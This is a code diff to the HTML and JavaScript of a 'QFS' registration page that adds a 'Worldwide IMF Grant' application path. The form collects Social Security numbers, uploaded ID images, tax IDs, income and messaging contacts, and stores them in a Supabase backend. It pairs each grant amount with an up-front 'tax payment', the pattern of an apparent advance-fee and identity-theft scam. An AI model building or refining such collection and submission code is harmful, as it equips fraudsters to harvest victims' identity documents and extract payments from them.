@@ -36,15 +36,6 @@
       border-color: #ef4444 !important;
       border-width: 2px !important;
     }
-    .debug-info {
-      font-size: 12px;
-      color: #666;
-      margin-top: 10px;
-      padding: 10px;
-      background: #f5f5f5;
-      border-radius: 5px;
-      display: none;
-    }
   </style>
   <!-- Load config FIRST, then Supabase -->
   <script src="config.js"></script>
@@ -100,15 +91,15 @@
         <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
           <div>
             <label class="font-semibold required-label">Date of Birth</label>
-            <input type="date" name="dob" required class="w-full mt-1 p-3 border rounded-lg">
+            <input type="date" name="dob" id="dob" required class="w-full mt-1 p-3 border rounded-lg">
           </div>
           <div>
             <label class="font-semibold required-label">Phone Number</label>
-            <input type="tel" name="phone" required class="w-full mt-1 p-3 border rounded-lg">
+            <input type="tel" name="phone" id="phone" required class="w-full mt-1 p-3 border rounded-lg">
           </div>
           <div>
             <label class="font-semibold required-label">Gender</label>
-            <select name="gender" required class="w-full mt-1 p-3 border rounded-lg">
+            <select name="gender" id="gender" required class="w-full mt-1 p-3 border rounded-lg">
               <option value="">Select…</option>
               <option>Male</option>
               <option>Female</option>
@@ -139,7 +130,7 @@
         <!-- PAYMENT OPTION -->
         <div class="mt-4">
           <label class="font-semibold required-label">Payment Option</label>
-          <select name="payment_option" required class="w-full mt-1 p-3 border rounded-lg">
+          <select name="payment_option" id="payment_option" required class="w-full mt-1 p-3 border rounded-lg">
             <option value="">Select payment option…</option>
             <option>Full Payment</option>
             <option>Bridge Payment</option>
@@ -150,24 +141,24 @@
         <h3 class="text-lg font-bold mt-6">Physical Address</h3>
         <div class="mt-2">
           <label class="font-semibold required-label">Street Address</label>
-          <input type="text" name="street_address" required class="w-full mt-1 p-3 border rounded-lg">
+          <input type="text" name="street_address" id="street_address" required class="w-full mt-1 p-3 border rounded-lg">
         </div>
         <div class="mt-4">
           <label class="font-semibold">Apartment / Suite</label>
-          <input type="text" name="apartment" class="w-full mt-1 p-3 border rounded-lg">
+          <input type="text" name="apartment" id="apartment" class="w-full mt-1 p-3 border rounded-lg">
         </div>
         <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
           <div>
             <label class="font-semibold required-label">City</label>
-            <input type="text" name="city" required class="w-full mt-1 p-3 border rounded-lg">
+            <input type="text" name="city" id="city" required class="w-full mt-1 p-3 border rounded-lg">
           </div>
           <div>
             <label class="font-semibold required-label">State / Province</label>
-            <input type="text" name="state" required class="w-full mt-1 p-3 border rounded-lg">
+            <input type="text" name="state" id="state" required class="w-full mt-1 p-3 border rounded-lg">
           </div>
           <div>
             <label class="font-semibold required-label">ZIP / Postal Code</label>
-            <input type="text" name="zip" required class="w-full mt-1 p-3 border rounded-lg">
+            <input type="text" name="zip" id="zip" required class="w-full mt-1 p-3 border rounded-lg">
           </div>
         </div>
         <div class="mt-4">
@@ -189,29 +180,29 @@
         <!-- SSN -->
         <div>
           <label class="font-semibold required-label">SSN</label>
-          <input type="text" name="imf_ssn" placeholder="XXX-XX-XXXX" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" name="imf_ssn" id="imf_ssn" placeholder="XXX-XX-XXXX" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- ID Upload Front & Back -->
         <div>
           <label class="font-semibold required-label">Upload Valid ID (Front)</label>
-          <input type="file" name="imf_id_front" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
+          <input type="file" name="imf_id_front" id="imf_id_front" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
         </div>
         <div>
           <label class="font-semibold required-label">Upload Valid ID (Back)</label>
-          <input type="file" name="imf_id_back" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
+          <input type="file" name="imf_id_back" id="imf_id_back" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
         </div>
 
         <!-- Email -->
         <div>
           <label class="font-semibold required-label">Email Address</label>
-          <input type="email" name="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address">
+          <input type="email" name="imf_email" id="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address">
         </div>
 
         <!-- Grant Amount -->
         <div>
           <label class="font-semibold required-label">Choose your Grant Application Amount</label>
-          <select name="imf_grant_amount" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <select name="imf_grant_amount" id="imf_grant_amount" class="imf-field w-full mt-1 p-3 border rounded-lg">
             <option value="">Select grant amount</option>
             <option value="10000">$10,000 (tax payment of $1,250)</option>
             <option value="20000">$20,000 (tax payment of $2,450)</option>
@@ -227,37 +218,37 @@
         <!-- Tax ID -->
         <div>
           <label class="font-semibold required-label">Tax ID</label>
-          <input type="text" name="imf_tax_id" placeholder="Tax ID number" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" name="imf_tax_id" id="imf_tax_id" placeholder="Tax ID number" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Address -->
         <div>
           <label class="font-semibold required-label">Address</label>
-          <input type="text" name="imf_address" placeholder="Street address" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" name="imf_address" id="imf_address" placeholder="Street address" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Country -->
         <div>
           <label class="font-semibold required-label">Country</label>
-          <input type="text" name="imf_country" placeholder="Your country" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" name="imf_country" id="imf_country" placeholder="Your country" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- WhatsApp/Telegram -->
         <div>
           <label class="font-semibold required-label">WhatsApp OR Telegram Number</label>
-          <input type="text" name="imf_whatsapp" placeholder="Include country code" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" name="imf_whatsapp" id="imf_whatsapp" placeholder="Include country code" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Phone Number -->
         <div>
           <label class="font-semibold required-label">Phone Number / Texting Number</label>
-          <input type="tel" name="imf_phone" placeholder="Phone number for texts" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="tel" name="imf_phone" id="imf_phone" placeholder="Phone number for texts" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Gender -->
         <div>
           <label class="font-semibold required-label">Gender</label>
-          <select name="imf_gender" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <select name="imf_gender" id="imf_gender" class="imf-field w-full mt-1 p-3 border rounded-lg">
             <option value="">Select gender</option>
             <option>Male</option>
             <option>Female</option>
@@ -269,28 +260,25 @@
         <!-- Date of Birth -->
         <div>
           <label class="font-semibold required-label">Date of Birth</label>
-          <input type="date" name="imf_dob" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="date" name="imf_dob" id="imf_dob" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Monthly Income -->
         <div>
           <label class="font-semibold required-label">Monthly Income</label>
-          <input type="text" name="imf_monthly_income" placeholder="Your monthly income" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" name="imf_monthly_income" id="imf_monthly_income" placeholder="Your monthly income" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Purpose -->
         <div>
           <label class="font-semibold required-label">Purpose of filling grant</label>
-          <textarea name="imf_purpose" placeholder="Please explain why you need this grant" rows="3" class="imf-field w-full mt-1 p-3 border rounded-lg"></textarea>
+          <textarea name="imf_purpose" id="imf_purpose" placeholder="Please explain why you need this grant" rows="3" class="imf-field w-full mt-1 p-3 border rounded-lg"></textarea>
         </div>
 
         <p class="text-xs text-gray-500 mt-4">By submitting, you agree to the IMF grant terms. All fields are required.</p>
       </div>
 
       <div id="regMsg" class="text-sm text-center hidden"></div>
-      
-      <!-- Debug info (hidden by default) -->
-      <div id="debugInfo" class="debug-info"></div>
       
       <button id="regSubmit" type="submit" class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700 transition disabled:opacity-50 disabled:cursor-not-allowed">
         Submit Registration
@@ -300,18 +288,6 @@
 
   <script>
     (() => {
-      // Debug function
-      function debug(message) {
-        console.log("DEBUG:", message);
-        const debugEl = document.getElementById('debugInfo');
-        if (debugEl) {
-          debugEl.innerHTML += '<div>' + new Date().toLocaleTimeString() + ': ' + message + '</div>';
-          debugEl.style.display = 'block';
-        }
-      }
-
-      debug("Script starting...");
-
       // Check if config is loaded
       if (!window.__QFS_CONFIG) {
         console.error("Config not loaded! Make sure config.js is loaded first.");
@@ -320,27 +296,19 @@
           msgEl.textContent = "Configuration error. Please refresh.";
           msgEl.classList.remove('hidden');
         }
-        debug("ERROR: Config not loaded");
         return;
       }
-
-      debug("Config loaded successfully");
 
       // Use the actual config values
       const SUPABASE_URL = window.__QFS_CONFIG.SUPABASE_URL;
       const SUPABASE_ANON_KEY = window.__QFS_CONFIG.SUPABASE_ANON_KEY;
 
-      debug(`Supabase URL: ${SUPABASE_URL ? 'found' : 'missing'}`);
-      debug(`Supabase Key: ${SUPABASE_ANON_KEY ? 'found' : 'missing'}`);
-
       // Initialize Supabase
       let supabase;
       try {
         supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-        debug("Supabase initialized successfully");
       } catch (err) {
         console.error("Failed to initialize Supabase:", err);
-        debug("ERROR: Failed to initialize Supabase: " + err.message);
         return;
       }
 
@@ -354,9 +322,6 @@
       const msg = document.getElementById("regMsg");
       const btn = document.getElementById("regSubmit");
       
-      debug(`Form found: ${!!form}`);
-      debug(`Button found: ${!!btn}`);
-
       // Regular fields
       const emailEl = document.getElementById("regEmail");
       const p1 = document.getElementById("regPass1");
@@ -365,6 +330,22 @@
       const middleNameEl = document.getElementById("middleName");
       const lastNameEl = document.getElementById("lastName");
       const countryEl = document.getElementById("countryEl");
+      
+      // Get all normal fields that need required toggling
+      const normalRequiredFields = [
+        document.getElementById("dob"),
+        document.getElementById("phone"),
+        document.getElementById("gender"),
+        document.getElementById("regEmail"),
+        document.getElementById("regPass1"),
+        document.getElementById("regPass2"),
+        document.getElementById("payment_option"),
+        document.getElementById("street_address"),
+        document.getElementById("city"),
+        document.getElementById("state"),
+        document.getElementById("zip"),
+        document.getElementById("countryEl")
+      ];
       
       // IMF fields
       const imfFields = document.querySelectorAll('.imf-field');
@@ -380,7 +361,6 @@
         msg.textContent = text;
         msg.className = "text-sm text-center " + (isSuccess ? "text-emerald-600" : "text-red-600");
         msg.classList.remove("hidden");
-        debug(`Message shown: ${text} (${isSuccess ? 'success' : 'error'})`);
         
         // Auto hide success messages after 5 seconds
         if (isSuccess) {
@@ -419,12 +399,16 @@
       if (middleNameEl) middleNameEl.addEventListener('input', updateImfNameDisplay);
       if (lastNameEl) lastNameEl.addEventListener('input', updateImfNameDisplay);
 
-      // Toggle IMF mode
+      // Toggle IMF mode - FIXED to properly handle required attributes
       function toggleImfMode(enableImf) {
-        debug(`Toggling IMF mode: ${enableImf}`);
         if (enableImf) {
-          // Hide normal fields
+          // Hide normal fields section
           if (normalFields) normalFields.style.display = "none";
+          
+          // Remove required from all normal fields
+          normalRequiredFields.forEach(field => {
+            if (field) field.required = false;
+          });
           
           // Change title and subtitle for IMF
           if (formTitle) formTitle.textContent = "🌍 Worldwide IMF Grant";
@@ -444,6 +428,11 @@
           // Show normal fields
           if (normalFields) normalFields.style.display = "block";
           
+          // Add required back to normal fields
+          normalRequiredFields.forEach(field => {
+            if (field) field.required = true;
+          });
+          
           // Restore original title and subtitle
           if (formTitle) formTitle.textContent = "QFS Registration Form";
           if (pageSubtitle) pageSubtitle.textContent = "Create your portal login password below. After submitting, you can sign in on the Login page.";
@@ -462,7 +451,6 @@
       if (regFor) {
         regFor.addEventListener("change", () => {
           const isImfSelected = (regFor.value === "WORLDWIDE IMF GRANT");
-          debug(`Registration type changed: ${regFor.value}, IMF: ${isImfSelected}`);
           toggleImfMode(isImfSelected);
           hideMessage();
         });
@@ -492,52 +480,231 @@
         toggleImfMode(true);
       }
 
-      // Form submission handler - SIMPLIFIED for testing
+      // Form submission handler
       let busy = false;
       
       if (form) {
-        debug("Adding submit event listener to form");
-        
         form.addEventListener("submit", async (e) => {
           e.preventDefault();
-          debug("Form submit triggered");
           
-          // Simple test - just show a message first to verify button works
-          showMessage("Button clicked! Processing...", true);
+          if (busy) {
+            showMessage("Already processing your request...", false);
+            return;
+          }
           
-          // For now, let's just do a simple test without Supabase
-          // Comment out the complex logic and just show success
+          busy = true;
+          if (btn) btn.disabled = true;
+          
+          const isIMF = (regFor && regFor.value === "WORLDWIDE IMF GRANT");
+          hideMessage();
           
           try {
-            // Basic validation
+            // Validate registration type first
             if (!regFor || !regFor.value) {
-              showMessage("Please select what you're registering for.", false);
+              if (regFor) {
+                regFor.focus();
+                regFor.classList.add('border-red-500');
+              }
+              throw new Error("Please select what you're registering for.");
+            }
+
+            // Validate common required fields
+            if (!firstNameEl || !firstNameEl.value.trim()) {
+              if (firstNameEl) {
+                firstNameEl.focus();
+                firstNameEl.classList.add('border-red-500');
+              }
+              throw new Error("First name is required.");
+            }
+            
+            if (!lastNameEl || !lastNameEl.value.trim()) {
+              if (lastNameEl) {
+                lastNameEl.focus();
+                lastNameEl.classList.add('border-red-500');
+              }
+              throw new Error("Last name is required.");
+            }
+
+            // Handle IMF submission
+            if (isIMF) {
+              // Validate all IMF fields
+              let firstInvalid = null;
+              
+              // Check regular input fields
+              imfFields.forEach(field => {
+                if (field.type !== 'file') {
+                  if (!field.value.trim()) {
+                    field.classList.add('border-red-500');
+                    if (!firstInvalid) firstInvalid = field;
+                  }
+                }
+              });
+              
+              // Check file inputs
+              const idFront = document.getElementById('imf_id_front');
+              const idBack = document.getElementById('imf_id_back');
+              
+              if (idFront && !idFront.files[0]) {
+                idFront.classList.add('border-red-500');
+                if (!firstInvalid) firstInvalid = idFront;
+              }
+              
+              if (idBack && !idBack.files[0]) {
+                idBack.classList.add('border-red-500');
+                if (!firstInvalid) firstInvalid = idBack;
+              }
+              
+              if (firstInvalid) {
+                firstInvalid.focus();
+                throw new Error("Please fill all required IMF fields and upload both ID images.");
+              }
+              
+              showMessage("Submitting IMF application...", true);
+              
+              try {
+                // Upload ID front
+                const fileFront = idFront.files[0];
+                const fileNameFront = `imf_${Date.now()}_front_${fileFront.name.replace(/[^a-z0-9.]/gi, '_')}`;
+                
+                const { error: uploadErrorFront } = await supabase.storage
+                  .from('imf-ids')
+                  .upload(fileNameFront, fileFront);
+                  
+                if (uploadErrorFront) throw new Error("Front ID upload failed: " + uploadErrorFront.message);
+                
+                // Upload ID back
+                const fileBack = idBack.files[0];
+                const fileNameBack = `imf_${Date.now()}_back_${fileBack.name.replace(/[^a-z0-9.]/gi, '_')}`;
+                
+                const { error: uploadErrorBack } = await supabase.storage
+                  .from('imf-ids')
+                  .upload(fileNameBack, fileBack);
+                  
+                if (uploadErrorBack) throw new Error("Back ID upload failed: " + uploadErrorBack.message);
+                
+                // Get signed URLs
+                const { data: frontUrlData } = await supabase.storage
+                  .from('imf-ids')
+                  .createSignedUrl(fileNameFront, 604800);
+                  
+                const { data: backUrlData } = await supabase.storage
+                  .from('imf-ids')
+                  .createSignedUrl(fileNameBack, 604800);
+                
+                // Prepare data for imf_applications table
+                const imfData = {
+                  first_name: firstNameEl ? firstNameEl.value.trim() : '',
+                  middle_name: middleNameEl ? middleNameEl.value.trim() : '',
+                  last_name: lastNameEl ? lastNameEl.value.trim() : '',
+                  ssn: document.getElementById('imf_ssn') ? document.getElementById('imf_ssn').value.trim() : '',
+                  id_front_url: frontUrlData?.signedUrl || '',
+                  id_back_url: backUrlData?.signedUrl || '',
+                  email: document.getElementById('imf_email') ? document.getElementById('imf_email').value.trim() : '',
+                  grant_amount: document.getElementById('imf_grant_amount') ? document.getElementById('imf_grant_amount').value : '',
+                  tax_id: document.getElementById('imf_tax_id') ? document.getElementById('imf_tax_id').value.trim() : '',
+                  address: document.getElementById('imf_address') ? document.getElementById('imf_address').value.trim() : '',
+                  country: document.getElementById('imf_country') ? document.getElementById('imf_country').value.trim() : '',
+                  whatsapp: document.getElementById('imf_whatsapp') ? document.getElementById('imf_whatsapp').value.trim() : '',
+                  phone: document.getElementById('imf_phone') ? document.getElementById('imf_phone').value.trim() : '',
+                  gender: document.getElementById('imf_gender') ? document.getElementById('imf_gender').value : '',
+                  dob: document.getElementById('imf_dob') ? document.getElementById('imf_dob').value : '',
+                  monthly_income: document.getElementById('imf_monthly_income') ? document.getElementById('imf_monthly_income').value.trim() : '',
+                  purpose: document.getElementById('imf_purpose') ? document.getElementById('imf_purpose').value.trim() : '',
+                  registering_for: 'WORLDWIDE IMF GRANT',
+                  created_at: new Date().toISOString()
+                };
+                
+                // Insert into imf_applications table
+                const { error: insertError } = await supabase
+                  .from('imf_applications')
+                  .insert([imfData]);
+                  
+                if (insertError) throw new Error("Database insert failed: " + insertError.message);
+                
+                showMessage("✅ IMF application submitted successfully! Your documents are securely stored.", true);
+                
+                // Reset form after success
+                setTimeout(() => {
+                  if (form) form.reset();
+                  toggleImfMode(false);
+                  busy = false;
+                  if (btn) btn.disabled = false;
+                }, 3000);
+                
+              } catch (uploadErr) {
+                throw new Error("Upload failed: " + uploadErr.message);
+              }
+              
               return;
             }
             
-            showMessage("Form submitted successfully! (Test mode)", true);
+            // --- NORMAL REGISTRATION PATH ---
+            // Validate email
+            if (!emailEl || !emailEl.value.trim()) {
+              if (emailEl) {
+                emailEl.focus();
+                emailEl.classList.add('border-red-500');
+              }
+              throw new Error("Email is required.");
+            }
             
-            // Reset after 2 seconds
+            // Validate passwords
+            if (!p1 || !p1.value) {
+              if (p1) {
+                p1.focus();
+                p1.classList.add('border-red-500');
+              }
+              throw new Error("Password is required.");
+            }
+            
+            if (p1.value.length < 8) {
+              if (p1) {
+                p1.focus();
+                p1.classList.add('border-red-500');
+              }
+              throw new Error("Password must be at least 8 characters.");
+            }
+            
+            if (p1.value !== p2.value) {
+              if (p2) {
+                p2.focus();
+                p2.classList.add('border-red-500');
+              }
+              throw new Error("Passwords do not match.");
+            }
+            
+            showMessage("Creating your portal account…", true);
+            
+            const { error } = await supabase.auth.signUp({
+              email: emailEl.value.trim().toLowerCase(),
+              password: p1.value.trim(),
+              options: {
+                data: {
+                  first_name: firstNameEl ? firstNameEl.value.trim() : '',
+                  middle_name: middleNameEl ? middleNameEl.value.trim() : '',
+                  last_name: lastNameEl ? lastNameEl.value.trim() : '',
+                  registering_for: regFor.value,
+                  country: countryEl ? countryEl.value.trim() : ''
+                },
+                emailRedirectTo: "https://qfsnesaragesara.org/login.html"
+              }
+            });
+            
+            if (error) throw error;
+            
+            showMessage("Account created successfully! ✅", true);
+            
+            // Redirect to success page
             setTimeout(() => {
-              busy = false;
-              if (btn) btn.disabled = false;
+              window.location.href = "https://qfsnesaragesara.org/success-registration.html";
             }, 2000);
             
           } catch (err) {
-            debug("Error: " + err.message);
+            console.error("Registration error:", err);
             showMessage(err.message, false);
             busy = false;
             if (btn) btn.disabled = false;
           }
-        });
-      } else {
-        debug("ERROR: Form element not found!");
-      }
-
-      // Test button click manually
-      if (btn) {
-        btn.addEventListener('click', function(e) {
-          debug("Button clicked directly");
         });
       }
     })();
